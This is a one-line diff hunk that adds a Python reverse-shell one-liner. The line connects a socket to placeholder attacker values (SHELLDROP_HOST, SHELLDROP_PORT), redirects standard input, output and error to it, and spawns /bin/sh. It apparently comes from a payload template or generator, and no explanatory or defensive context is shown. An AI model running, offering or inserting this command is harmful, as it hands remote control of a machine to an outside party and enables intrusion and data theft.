@@ -1,0 +1,1 @@
+python -c 'a=__import__;s=a("socket").socket;o=a("os").dup2;p=a("pty").spawn;c=s();c.connect(("SHELLDROP_HOST",SHELLDROP_PORT));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'
